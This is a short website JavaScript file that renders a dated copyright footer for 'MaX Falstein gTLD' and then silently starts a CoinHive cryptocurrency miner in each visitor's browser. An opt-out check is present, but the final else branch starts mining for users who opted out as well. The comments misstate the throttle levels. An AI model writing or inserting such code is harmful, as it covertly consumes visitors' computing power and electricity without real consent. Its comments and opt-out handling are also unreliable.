var d = new Date();
var year = d.getFullYear().toString();
var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
var month = m[d.getMonth()];
var footer = "";
var footer0 = "MaX Falstein gTLD &copy; MaX Falstein and Falstein Inc. &#8212; ";
var footer1 = " ";
var footer2 = " &#8212; Patents and Trademarks Pending";
footer = footer0.concat(month.concat(footer1.concat(year.concat(footer2))));
document.getElementById("footer").innerHTML = footer;

var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // desktop @ 70%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
  miner.start();
} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // mobile @ 30%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
  miner.start();
} else {
  // unknown device @ 50%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
  miner.start();
}
